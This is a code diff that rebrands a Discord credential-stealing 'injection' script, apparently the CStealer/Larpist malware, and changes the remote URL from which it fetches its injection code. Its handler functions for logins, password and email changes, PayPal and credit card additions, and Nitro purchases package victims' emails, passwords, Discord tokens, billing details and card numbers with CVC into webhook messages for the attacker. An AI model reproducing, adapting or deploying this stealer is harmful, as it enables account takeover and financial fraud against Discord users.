@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Novis Injection', 
-  embed_icon: 'https://i.imgur.com/EHD6KHJ.png'.replace(/ /g, '%20'), 
+  embed_name: 'Larpist Injection', 
+  embed_icon: 'https://media.discordapp.net/attachments/1234182404248178848/1234184692660568105/larplogov3.png?ex=664b7f10&is=664a2d90&hm=3ddc11922dddf11f5d6c9b94a97806a9b471f40d6fe2b49f3f66e5b657e5af7b&=&format=webp&quality=lossless'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/r3nko/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js', 
   /**
    
    **/
@@ -660,17 +660,17 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
+            name: '**Account Information**',
+            value: `<:mail:1095741024678191114> Email: **${email}** - <:blacklock:1095741022065131571> Password: **${password}**`,
             inline: false,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: false,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -680,7 +680,8 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Renko & Ledger・https://github.com/r3nko',
+            text: 'Larpist Injection・https://github.com/depicting',
+            icon_url: "https://media.discordapp.net/attachments/1234182404248178848/1234184692660568105/larplogov3.png?ex=664b7f10&is=664a2d90&hm=3ddc11922dddf11f5d6c9b94a97806a9b471f40d6fe2b49f3f66e5b657e5af7b&=&format=webp&quality=lossless"
         },
       },
     ],
@@ -703,16 +704,16 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
+            value: `<:mail:1095741024678191114> Email: **${json.email}**\n<:blacklock:1095741022065131571> Old Password: **${oldpassword}**\n<:blacklock:1095741022065131571> New Password: **${newpassword}**`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -722,7 +723,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Renko & Ledger・https://github.com/r3nko',
+            text: 'Larpist Injection・https://github.com/depicting',
+            icon_url: "https://media.discordapp.net/attachments/1234182404248178848/1234184692660568105/larplogov3.png?ex=664b7f10&is=664a2d90&hm=3ddc11922dddf11f5d6c9b94a97806a9b471f40d6fe2b49f3f66e5b657e5af7b&=&format=webp&quality=lossless"
         },
       },
     ],
@@ -745,16 +747,16 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
+            value: `<:mail:1095741024678191114> New Email: **${email}**\n<:blacklock:1095741022065131571> Password: **${password}**`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -764,7 +766,8 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Renko & Ledger・https://github.com/r3nko',
+            text: 'Larpist Injection・https://github.com/depicting',
+            icon_url: "https://media.discordapp.net/attachments/1234182404248178848/1234184692660568105/larplogov3.png?ex=664b7f10&is=664a2d90&hm=3ddc11922dddf11f5d6c9b94a97806a9b471f40d6fe2b49f3f66e5b657e5af7b&=&format=webp&quality=lossless"
         },
       },
     ],
@@ -791,12 +794,12 @@ const PaypalAdded = async (token) => {
             inline: false,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -806,7 +809,8 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Renko & Ledger・https://github.com/r3nko',
+            text: 'Larpist Injection・https://github.com/depicting',
+            icon_url: "https://media.discordapp.net/attachments/1234182404248178848/1234184692660568105/larplogov3.png?ex=664b7f10&is=664a2d90&hm=3ddc11922dddf11f5d6c9b94a97806a9b471f40d6fe2b49f3f66e5b657e5af7b&=&format=webp&quality=lossless"
         },
       },
     ],
@@ -833,12 +837,12 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -848,7 +852,8 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Renko & Ledger・https://github.com/r3nko',
+            text: 'Larpist Injection・https://github.com/can-kat/cstealer',
+            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
         },
       },
     ],
@@ -877,12 +882,12 @@ const nitroBought = async (token) => {
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -892,7 +897,8 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Renko & Ledger・https://github.com/r3nko',
+            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
+            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
         },
       },
     ],
